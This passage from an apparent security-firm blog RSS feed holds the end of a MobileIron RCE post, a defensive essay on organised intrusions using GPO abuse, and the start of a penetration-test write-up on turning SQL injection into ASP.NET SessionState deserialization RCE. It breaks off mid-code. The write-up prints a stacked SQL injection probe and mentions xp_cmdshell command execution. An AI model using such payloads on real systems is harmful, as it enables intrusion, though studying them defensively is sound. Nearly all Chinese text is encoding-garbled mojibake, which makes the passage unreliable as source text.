  &lt;li&gt;CVE-2020-15506 æœ¬è³ªä¸Šå…¶å¯¦æ˜¯ä¸€å€‹å¾ˆæœ‰è¶£çš„èªè­‰ç¹éæ¼æ´&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å¸Œæœ›é€™ç¯‡æ–‡ç« èƒ½å¤ å–šèµ·å¤§çœ¾å°æ–¼ MDM æ”»æ“Šé¢çš„æ³¨æ„ï¼Œä»¥åŠä¼æ¥­å®‰å…¨çš„é‡è¦æ€§! æ„Ÿè¬æ”¶çœ‹ :D&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM/</link>
                <guid>https://devco.re/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM</guid>
                <pubDate>Sat, 12 Sep 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>æ•µäººä¸æ˜¯å‹’è´–è»Ÿé«”ï¼Œè€Œæ˜¯çµ„ç¹”å‹é§­å®¢</title>
                <description>&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h2&gt;

&lt;p&gt;é§­å®¢æ”»æ“Šäº‹ä»¶ä¸€ç›´å­˜åœ¨æ–¼çœŸå¯¦ä¸–ç•Œï¼Œåªæ˜¯é®®å°‘è¢«å®Œæ•´å…¬é–‹æ­éœ²ã€‚ä»Šå¹´åœ‹å…§ä¸€äº›é‡å¤§é—œéµåŸºç¤è¨­æ–½ (Critical Information Infrastructure Protectionï¼ŒCIIP) ä»¥åŠåœ‹å…§çš„è·¨åœ‹ä¼æ¥­ç´›ç´›ç™¼ç”Ÿåš´é‡çš„è³‡å®‰äº‹ä»¶ï¼Œæˆ‘å€‘æƒ³ç°¡å–®çš„è·Ÿå¤§å®¶è«‡è«‡é€™äº›äº‹ä»¶èƒŒå¾Œä¼æ¥­çœŸæ­£éœ€è¦æ€è€ƒåŠé‡è¦–çš„æ ¸å¿ƒå•é¡Œã€‚&lt;/p&gt;

&lt;h2 id=&quot;ä¼æ¥­é¢å°çš„æ˜¯çµ„ç¹”å‹é§­å®¢è€Œä¸åªæ˜¯å‹’è´–è»Ÿé«”&quot;&gt;ä¼æ¥­é¢å°çš„æ˜¯çµ„ç¹”å‹é§­å®¢è€Œä¸åªæ˜¯å‹’è´–è»Ÿé«”&lt;/h2&gt;

&lt;p&gt;ä¸çŸ¥é“æ˜¯å› ç‚ºå‹’è´–è»Ÿé«”æ¯”è¼ƒå¸ç›é‚„æ˜¯ä»€éº¼ç·£æ•…ï¼Œåª’é«”æ¯”è¼ƒå–œæ­¡ç”¨å‹’è´–è»Ÿé«”ä½œç‚ºæ¨™é¡Œå‘ˆç¾è¿‘å¹´ä¼æ¥­é¢è‡¨çš„é‡å¤§å¨è„…ã€‚å¯¦éš›ä¸Šï¼Œå‹’è´–è»Ÿé«”åªæ˜¯æ”»æ“Šéç¨‹çš„å·¥å…·ã€åŠ å¯†åªæ˜¯å‹’è´–çš„æ‰‹æ®µä¹‹ä¸€ï¼Œç”šè‡³åŒ…å«ç«Šå–æ©Ÿæ•è³‡æ–™ã€‚å› ç‚ºé€™äº›äº‹ä»¶æˆ‘å€‘æ²’æœ‰åƒèˆ‡èª¿æŸ¥æˆ–ç›¸é—œçš„æ´»å‹•ï¼Œæˆ‘å€‘åƒ…å°±å·²å…¬é–‹æ­éœ²çš„è³‡æ–™ä¾†ä¸€çªºé¢å°é€™æ¨£çš„å¨è„…ï¼Œä¼æ¥­çš„å…·é«”åšæ³•æœ‰å“ªäº›ï¼Ÿ&lt;/p&gt;

&lt;p&gt;æ ¹æ“šæ³•å‹™éƒ¨èª¿æŸ¥å±€åœ¨ iThome 2020 è³‡å®‰å¤§æœƒçš„&lt;a href=&quot;https://www.ithome.com.tw/news/139331&quot;&gt;åˆ†äº«&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;åœ¨é€™èµ·æ”»æ“Šäº‹ä»¶ä¸­ï¼Œé§­å®¢é¦–å…ˆå¾ Web ä¼ºæœå™¨ã€å“¡å·¥é›»è…¦ç­‰é€”å¾‘ï¼Œå…¥ä¾µå…¬å¸ç³»çµ±é•·æœŸæ½›ä¼åŠæ¢æ¸¬ï¼Œè€Œå¾Œç«Šå–å¸³è™Ÿæ¬Šé™ï¼Œé€²å…¥ AD ä¼ºæœå™¨ï¼Œåˆ©ç”¨å‡Œæ™¨æ™‚æ®µç«„æ”¹ç¾¤çµ„æ´¾é€åŸå‰‡ï¼ˆGPOï¼‰ï¼ŒåŒæ™‚é åŸ‹ lc.tmp æƒ¡æ„ç¨‹å¼åˆ°å…§éƒ¨ä¼ºæœå™¨ä¸­ï¼Œç­‰åˆ°å“¡å·¥ä¸Šç­æ‰“é–‹é›»è…¦å¾Œï¼Œé›»è…¦ç«‹å³å¥—ç”¨é­ç«„æ”¹çš„ GPOï¼Œä¾æ“šæŒ‡ä»¤å°±æœƒè‡ªå‹•å°‡å‹’ç´¢è»Ÿé«”è¼‰åˆ°è¨˜æ†¶é«”ä¸­ä¾†åŸ·è¡Œã€‚&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ä¼æ¥­åœ¨è¢«å‹’è´–è»Ÿé«”åŠ å¯†å¾Œï¼Œå¾€å¾€ç¬¬ä¸€æ™‚é–“å®¹æ˜“ç›´è¦ºæƒ³åˆ°é˜²æ¯’è»Ÿé«”æˆ–ç«¯é»é˜²è­·è¨­å‚™ç‚ºä½•æ²’æœ‰ç”Ÿæ•ˆï¼Ÿç¾å¯¦æ˜¯ï¼Œå¦‚æœä¼æ¥­é¢å°çš„æ˜¯é‡å°å¼çš„æ”»æ“Šï¼ˆAdvanced Persistent Threatï¼ŒAPTï¼‰ï¼Œæ”»æ“Šè€…å‹¢å¿…æœƒç ”ç©¶å¯ä»¥ç¹éä¼æ¥­çš„é˜²è­·æˆ–ç›£æ§çš„æ–¹å¼ã€‚æ‰€ä»¥ä¼æ¥­è¦æ€è€ƒçš„æ‡‰è©²æ˜¯ä¸€å€‹é˜²ç¦¦æˆ°ç·šæˆ–æ›´ç‚ºå…¨é¢çš„é˜²è­·ç­–ç•¥ï¼Œè€Œéä»°è³´å–®ä¸€çš„è³‡å®‰è¨­å‚™æˆ–æœå‹™ã€‚&lt;/p&gt;

&lt;p&gt;å¾ä¸Šè¿°çš„æ•˜è¿°ï¼Œæˆ‘å€‘å¯ä»¥ç™¼ç¾å¹¾å€‹å•é¡Œï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Web ä¼ºæœå™¨å…·æœ‰å¯åˆ©ç”¨çš„æ¼æ´&lt;/strong&gt;ï¼Œè€Œé€™å€‹æ¼æ´å¯èƒ½å°è‡´ä¸»æ©Ÿè¢«å–å¾—æ¬Šé™é€²è¡Œå¾ŒçºŒçš„æ©«å‘ç§»å‹•ã€‚é€ æˆé€™å€‹å•é¡Œçš„åŸå› å¯èƒ½åŒ…å«ï¼š
    &lt;ul&gt;
      &lt;li&gt;ç³»çµ±å¾æœªé€²è¡Œé«˜å¼·åº¦çš„æ»²é€æ¸¬è©¦åŠå®šæœŸåŸ·è¡Œå¼±é»æƒæ&lt;/li&gt;
      &lt;li&gt;å±¬æ–¼è€èˆŠç„¡æ³•ä¿®è£œçš„ç³»çµ±ï¼ˆä½¿ç”¨è€èˆŠçš„æ¡†æ¶ã€ç¨‹å¼èªè¨€ï¼‰æˆ–æ˜¯å» å•†å·²ç¶“ä¸å†ç¶­è­·&lt;/li&gt;
      &lt;li&gt;ä¸€æ¬¡æ€§çš„æ´»å‹•ç¶²ç«™æˆ–æ¸¬è©¦ç¶²ç«™ï¼Œæ´»å‹•æˆ–æ¸¬è©¦çµæŸå¾Œæœªä¾ç…§ç¨‹åºä¸‹ç·šï¼Œæˆç‚ºä¼æ¥­é˜²ç¦¦ç ´å£&lt;/li&gt;
      &lt;li&gt;ä¸åœ¨ä¼æ¥­ç›¤é»çš„é˜²è­·ç¯„åœå…§ï¼ˆå¦‚å‰ç«¯æœªè¨­ç½® WAFï¼‰&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;å¾å“¡å·¥é›»è…¦æˆ–æ˜¯ Web ä¼ºæœå™¨å¯ä»¥é€æ­¥è·³åˆ° AD ä¼ºæœå™¨&lt;/strong&gt;ï¼Œå¯èƒ½å­˜åœ¨çš„å•é¡Œå‰‡åŒ…å«ï¼š
    &lt;ul&gt;
      &lt;li&gt;ç¶²è·¯é–“çš„å€éš”ä¸åš´è¬¹ï¼Œä¾‹å¦‚æœªä¾ç…§è³‡æ–™æˆ–ç³»çµ±çš„é‡è¦æ€§é€²è¡Œå€éš”&lt;/li&gt;
      &lt;li&gt;åŒç¶²æ®µä¼ºæœå™¨é–“çš„é€šè¨Šæ–¹å¼ç®¡æ§ä¸ç•¶ï¼Œæ²’æœ‰é–‹å•Ÿæˆ–ç®¡åˆ¶é‡è¦ä¼ºæœå™¨çš„é€šè¨ŠåŸ æˆ–é™åˆ¶ä¾†æº IP ä½å€&lt;/li&gt;
      &lt;li&gt;ç³»çµ±å­˜åœ¨å¯åˆ©ç”¨å–å¾—æ¬Šé™çš„å¼±é»&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;åˆ©ç”¨å‡Œæ™¨æ™‚æ®µç«„æ”¹ç¾¤çµ„æ´¾é€åŸå‰‡&lt;/strong&gt;ï¼šæœ€å¾Œæ˜¯å›æ‡‰æ©Ÿåˆ¶æœªå³æ™‚ï¼ˆåŒ…å«äººå“¡æ¥ç²å‘Šè­¦å¾Œè™•ç†ä¸ç•¶ï¼‰ï¼Œä¼æ¥­å°æ–¼å…·æœ‰é›†ä¸­ç®¡ç†æ¬Šé™çš„é‡è¦ç³»çµ±ï¼Œä¾‹å¦‚ AD Serverã€è³‡ç”¢ç®¡ç†è»Ÿé«”ç­‰é€™é¡å‹çš„ä¸»æ©Ÿï¼Œé™¤äº†å°ç‰¹æ¬Šå¸³è™Ÿé«˜å¼·åº¦çš„ç®¡ç†å¤–ï¼ˆå¦‚ OTPï¼‰ï¼Œä¹Ÿæ‡‰è©²é‡å°ã€Œç•°å¸¸å¸³è™Ÿç™»å…¥ã€ã€ã€Œç•°å¸¸å¸³è™Ÿæ–°å¢åˆ°ç¾¤çµ„ã€ã€ã€Œæ­£å¸¸å¸³è™Ÿç•°å¸¸ç™»å…¥æ™‚é–“ã€ã€ã€Œæ–°å¢æ’ç¨‹æˆ– GPOã€ç­‰è¡Œç‚ºç™¼å‡ºå‘Šè­¦ï¼›è€Œå„ç¨®å‘Šè­¦ä¹Ÿæ‡‰è©²ä¾ç…§è³‡ç”¢çš„é‡è¦æ€§è¨‚å®šä¸åŒçš„ SLA å›æ‡‰èˆ‡è™•ç†ã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;ä½ éœ€è¦æ›´å…¨é¢ç›®æ¨™å°å‘çš„æ–¹å¼æ€è€ƒä¼æ¥­è³‡å®‰ç¾æ³&quot;&gt;ä½ éœ€è¦æ›´å…¨é¢ã€ç›®æ¨™å°å‘çš„æ–¹å¼æ€è€ƒä¼æ¥­è³‡å®‰ç¾æ³&lt;/h2&gt;

&lt;p&gt;æˆ‘å€‘åœ¨è¿‘ä¸‰å¹´çš„ç´…éšŠæ¼”ç·´ï¼Œä»¥ä¼æ¥­å°å…¶ç‡Ÿé‹æœ€é—œéµçš„è³‡è¨Šè³‡ç”¢ä½œç‚ºæ¼”ç·´æ¨™çš„ï¼Œä¸¦æ¨¡æ“¬çµ„ç¹”å‹é§­å®¢çš„æ”»æ“Šæ¨¡å¼ï¼Œé€éå¤–éƒ¨æƒ…æœã€å–å¾—å¤–éƒ¨ç³»çµ±æ¬Šé™ã€æ©«å‘ç§»å‹•ã€æŒçºŒå–å¾—æ›´å¤šå…§éƒ¨ä¼ºæœå™¨æ¬Šé™åŠææ¬Šã€ç ´è§£å¯†ç¢¼ï¼Œæœ€çµ‚é”åˆ°ä¼æ¥­æŒ‡å®šçš„é—œéµè³‡ç”¢åŸ·è¡Œæ¼”ç·´æƒ…å¢ƒã€‚è€Œä¼æ¥­é€éé«˜å¼·åº¦ä¸”ç²¾æº–çš„æ¼”ç·´éç¨‹ï¼Œé™¤äº†æ˜ç¢ºæŒæ¡å¯è¢«å…¥ä¾µçš„è·¯å¾‘å¤–ï¼Œæ›´å¾—ä»¥æª¢è¦–ä¸Šè¿°å•é¡Œçš„ä¸è¶³ä¸¦æŒçºŒæ”¹å–„ã€‚&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘èªç‚ºï¼Œåªè¦ä½ çš„ä¼æ¥­å¤ é‡è¦ï¼ˆå°é§­å®¢è€Œè¨€é‡è¦ï¼Œè€Œä¸æ˜¯è‡ªå·±è¦ºå¾—é‡è¦ï¼‰ï¼Œçµ„ç¹”å‹çš„æ”»æ“Šå°±ä¸æœƒåœæ­‡ï¼ä¼æ¥­å”¯æœ‰ä¸æ–·çš„æ‰¾å‡ºè‡ªå·±ä¸è¶³ä¹‹è™•ï¼ŒæŒçºŒæå‡è‡ªå·±çš„é˜²ç¦¦å¼·åº¦æ‰æ˜¯èƒ½çœŸæ­£é™ä½é¢¨éšªçš„æ­£ç¢ºä½œæ³•ã€‚&lt;/p&gt;

&lt;p&gt;è‡³æ–¼ã€Œç¬¬ä¸‰æ–¹ä¾›æ‡‰éˆå®‰å…¨ã€åŠã€Œå¦‚ä½•æ›´å®Œæ•´çš„åˆ¶å®šè³‡å®‰ç­–ç•¥ã€ï¼Œæˆ‘å€‘å°‡æ‰¾æ™‚é–“å¦å¤–è·Ÿå¤§å®¶èªªæ˜ã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2020/08/21/the-enemy-is-not-ransomware-its-nation-state-hackers/</link>
                <guid>https://devco.re/blog/2020/08/21/the-enemy-is-not-ransomware-its-nation-state-hackers</guid>
                <pubDate>Fri, 21 Aug 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>å¾ SQL åˆ° RCE: åˆ©ç”¨ SessionState ååºåˆ—åŒ–æ”»æ“Š ASP.NET ç¶²ç«™æ‡‰ç”¨ç¨‹å¼</title>
                <description>&lt;p&gt;ä»Šæ—¥ä¾†èŠèŠåœ¨å»å¹´æŸæ¬¡æ»²é€æ¸¬è©¦éä¸­ç™¼ç¾çš„è¶£äº‹ï¼Œé‚£æ˜¯åœ¨ä¸€å€‹é¢¨å’Œæ—¥éº—çš„ä¸‹åˆï¼Œèˆ‡å¾€å¸¸ä¸€æ¨£é€²è¡Œè‘—æ¯ç‡¥çš„æ¸¬è©¦ç’°ç¯€ï¼Œå°æ¯å€‹åƒæ•¸å˜—è©¦å„ç¨®å¯èƒ½çš„æ³¨å…¥ï¼Œä½†é²é²æ²’æœ‰ä»»ä½•é€²å±•å’Œçªç ´ï¼Œç›´åˆ°åœ¨æŸå€‹é é¢ä¸Šæ³¨å…¥ &lt;code class=&quot;highlighter-rouge&quot;&gt;?id=1; waitfor delay &#39;00:00:05&#39;--&lt;/code&gt;ï¼Œç„¶å¾Œä»–å°±å¡ä½äº†ï¼Œéäº†æ°å¥½ 5 ç§’é˜å¾Œä¼ºæœå™¨åˆæœ‰å›æ‡‰ï¼Œé€™è¡¨ç¤ºæˆ‘å€‘æ‰¾åˆ°ä¸€å€‹ SQL Server ä¸Šçš„ SQL Injectionï¼&lt;/p&gt;

&lt;p&gt;ä¸€äº›é™³èˆŠã€é¾å¤§çš„ç³»çµ±ä¸­ï¼Œå› ç‚ºä¸€äº›è¤‡é›œçš„å› ç´ ï¼Œå¾€å¾€ä»ä½¿ç”¨è‘— sa å¸³æˆ¶ä¾†ç™»å…¥ SQL Serverï¼Œè€Œåœ¨æœ‰å¦‚æ­¤é«˜æ¬Šé™çš„è³‡æ–™åº«å¸³æˆ¶å‰æä¸‹ï¼Œæˆ‘å€‘å¯ä»¥è¼•æ˜“åˆ©ç”¨ xp_cmdshell ä¾†åŸ·è¡Œç³»çµ±æŒ‡ä»¤ä»¥å–å¾—è³‡æ–™åº«ä¼ºæœå™¨çš„ä½œæ¥­ç³»çµ±æ§åˆ¶æ¬Šï¼Œä½†å‡å¦‚æ•…äº‹æœ‰å¦‚æ­¤é †åˆ©ï¼Œå°±ä¸æœƒå‡ºç¾é€™ç¯‡æ–‡ç« ï¼Œæ‰€ä»¥ç†æ‰€ç•¶ç„¶æˆ‘å€‘å–å¾—çš„è³‡æ–™åº«å¸³æˆ¶ä¸¦æ²’æœ‰è¶³å¤ æ¬Šé™ã€‚ä½†å› ç‚ºç™¼ç¾çš„ SQL Injection æ˜¯ Stacked basedï¼Œæˆ‘å€‘ä»ç„¶å¯ä»¥å°è³‡æ–™è¡¨åš CRUDï¼Œé‹æ°£å¥½æ§åˆ¶åˆ°ä¸€äº›ç¶²ç«™è¨­å®šè®Šæ•¸çš„è©±ï¼Œç”šè‡³å¯ä»¥ç›´æ¥é”æˆ RCEï¼Œæ‰€ä»¥é‚„æ˜¯è©¦è‘— dump schema ä»¥äº†è§£æ¶æ§‹ï¼Œè€Œåœ¨ dump éç¨‹ä¸­ç™¼ç¾äº†ä¸€å€‹æœ‰è¶£çš„è³‡æ–™åº«ï¼š&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Database: ASPState
[2 tables]
+---------------------------------------+
| dbo.ASPStateTempApplications          |
| dbo.ASPStateTempSessions              |
+---------------------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é–±è®€æ–‡ä»¶å¾Œäº†è§£åˆ°ï¼Œé€™å€‹è³‡æ–™åº«çš„å­˜åœ¨ç”¨é€”æ˜¯ç”¨ä¾†ä¿å­˜ ASP.NET ç¶²ç«™æ‡‰ç”¨ç¨‹å¼çš„ sessionã€‚ä¸€èˆ¬æƒ…æ³ä¸‹é è¨­ session æ˜¯å„²å­˜åœ¨ ASP.NET ç¶²ç«™æ‡‰ç”¨ç¨‹å¼çš„è¨˜æ†¶é«”ä¸­ï¼Œä½†æŸäº›åˆ†æ•£å¼æ¶æ§‹ï¼ˆä¾‹å¦‚ Load Balance æ¶æ§‹ï¼‰çš„æƒ…æ³ä¸‹ï¼ŒåŒæ™‚æœƒæœ‰å¤šå€‹ä¸€æ¨¡ä¸€æ¨£çš„ ASP.NET ç¶²ç«™æ‡‰ç”¨ç¨‹å¼é‹è¡Œåœ¨ä¸åŒä¼ºæœå™¨ä¸»æ©Ÿä¸Šï¼Œè€Œä½¿ç”¨è€…æ¯æ¬¡è«‹æ±‚æ™‚è¢«åˆ†é…åˆ°çš„ä¼ºæœå™¨ä¸»æ©Ÿä¹Ÿä¸æœƒå®Œå…¨ä¸€è‡´ï¼Œå°±æœƒéœ€è¦æœ‰å¯ä»¥è®“å¤šå€‹ä¸»æ©Ÿå…±äº« session çš„æ©Ÿåˆ¶ï¼Œè€Œå„²å­˜åœ¨ SQL Server ä¸Šå°±æ˜¯ä¸€ç¨®è§£æ±ºæ–¹æ¡ˆä¹‹ä¸€ï¼Œæƒ³å•Ÿç”¨é€™å€‹æ©Ÿåˆ¶å¯ä»¥åœ¨ web.config ä¸­æ·»åŠ å¦‚ä¸‹è¨­å®šï¼š&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;system.web&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- å°‡ session ä¿å­˜åœ¨ SQL Server ä¸­ã€‚ --&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;sessionState&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;mode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SQLServer&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;sqlConnectionString=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;data source=127.0.0.1;user id=&amp;lt;username&amp;gt;;password=&amp;lt;password&amp;gt;&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;timeout=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;20&quot;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
        
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- é è¨­å€¼ï¼Œå°‡ session ä¿å­˜åœ¨è¨˜æ†¶é«”ä¸­ã€‚ --&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- &amp;lt;sessionState mode=&quot;InProc&quot; timeout=&quot;20&quot; /&amp;gt; --&amp;gt;&lt;/span&gt;
 
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- å°‡ session ä¿å­˜åœ¨ ASP.NET State Service ä¸­ï¼Œ
             å¦ä¸€ç¨®è·¨ä¸»æ©Ÿå…±äº« session çš„è§£æ±ºæ–¹æ¡ˆã€‚ --&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!--
        &amp;lt;sessionState
            mode=&quot;StateServer&quot;
            stateConnectionString=&quot;tcpip=localhost:42424&quot;
            timeout=&quot;20&quot;
        /&amp;gt;
        --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/system.web&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è€Œè¦åœ¨è³‡æ–™åº«ä¸­å»ºç«‹ ASPState çš„è³‡æ–™åº«ï¼Œå¯ä»¥åˆ©ç”¨å…§å»ºçš„å·¥å…· &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_regsql.exe&lt;/code&gt; å®Œæˆé€™å€‹ä»»å‹™ï¼Œåªéœ€è¦ä½¿ç”¨ä¸‹è¿°æŒ‡ä»¤å³å¯ï¼š&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# å»ºç«‹ ASPState è³‡æ–™åº«&lt;/span&gt;
aspnet_regsql.exe &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; 127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; sa &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; password &lt;span class=&quot;nt&quot;&gt;-ssadd&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sstype&lt;/span&gt; p

&lt;span class=&quot;c&quot;&gt;# ç§»é™¤ ASPState è³‡æ–™åº«&lt;/span&gt;
aspnet_regsql.exe &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; 127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; sa &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; password &lt;span class=&quot;nt&quot;&gt;-ssremove&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sstype&lt;/span&gt; p
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç¾åœ¨æˆ‘å€‘äº†è§£å¦‚ä½•è¨­å®š session çš„å„²å­˜ä½ç½®ï¼Œä¸”åˆå¯ä»¥æ§åˆ¶ ASPState è³‡æ–™åº«ï¼Œå¯ä»¥åšåˆ°äº›ä»€éº¼å‘¢ï¼Ÿé€™å°±æ˜¯æ–‡ç« æ¨™é¡Œçš„é‡é»ï¼Œå–å¾— Remote Code Executionï¼&lt;/p&gt;

&lt;p&gt;ASP.NET å…è¨±æˆ‘å€‘åœ¨ session ä¸­å„²å­˜ä¸€äº›ç‰©ä»¶ï¼Œä¾‹å¦‚å„²å­˜ä¸€å€‹ List ç‰©ä»¶ï¼š&lt;code class=&quot;highlighter-rouge&quot;&gt;Session[&quot;secret&quot;] = new List&amp;lt;String&amp;gt;() { &quot;secret string&quot; };&lt;/code&gt;ï¼Œå°æ–¼å¦‚ä½•å°‡é€™äº›ç‰©ä»¶ä¿å­˜åˆ° SQL Server ä¸Šï¼Œç†æ‰€ç•¶ç„¶åœ°ä½¿ç”¨äº†&lt;strong&gt;åºåˆ—åŒ–æ©Ÿåˆ¶&lt;/strong&gt;ä¾†è™•ç†ï¼Œè€Œæˆ‘å€‘åˆæ§åˆ¶äº†è³‡æ–™åº«ï¼Œæ‰€ä»¥ä¹Ÿèƒ½åŸ·è¡Œä»»æ„ååºåˆ—åŒ–ï¼Œç‚ºæ­¤éœ€è¦å…ˆäº†è§£ Session ç‰©ä»¶åºåˆ—åŒ–èˆ‡ååºåˆ—åŒ–çš„éç¨‹ã€‚&lt;/p&gt;

&lt;p&gt;ç°¡å–®é–±è®€ç¨‹å¼ç¢¼å¾Œï¼Œå¾ˆå¿«å°±å¯ä»¥å®šä½å‡ºè™•ç†ç›¸é—œéç¨‹çš„é¡åˆ¥ï¼Œç‚ºäº†ç¸®æ¸›èªªæ˜çš„ç¯‡å¹…ï¼Œä»¥ä¸‹å°‡ç›´æ¥åˆ‡å…¥é‡é»èªªæ˜å¾è³‡æ–™åº«å–å‡ºè³‡æ–™å¾Œé€²è¡Œäº†ä»€éº¼æ¨£çš„ååºåˆ—åŒ–æ“ä½œã€‚æ ¸å¿ƒä¸»è¦æ˜¯é€éå‘¼å« &lt;code class=&quot;highlighter-rouge&quot;&gt;SqlSessionStateStore.GetItem&lt;/code&gt; å‡½å¼é‚„åŸå‡º Session ç‰©ä»¶ï¼Œé›–ç„¶å·²ç›¡å¯èƒ½æŠŠç„¡é—œç·Šè¦çš„ç¨‹å¼ç¢¼ç§»é™¤ï¼Œä½†è¡Œæ•¸é‚„æ˜¯åå¤šï¼Œå¦‚æœæ‡¶å¾—é–±è®€ç¨‹å¼ç¢¼çš„æœ‹å‹å¯ä»¥ç›´æ¥ä¸‹æ‹‰ç¹¼çºŒçœ‹æ–‡ç« èªªæ˜ XD&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System.Web.SessionState&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;internal&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SqlSessionStateStore&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateStoreProviderBase&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateStoreData&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;GetItem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;locked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TimeSpan&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockAge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateActions&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actionFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
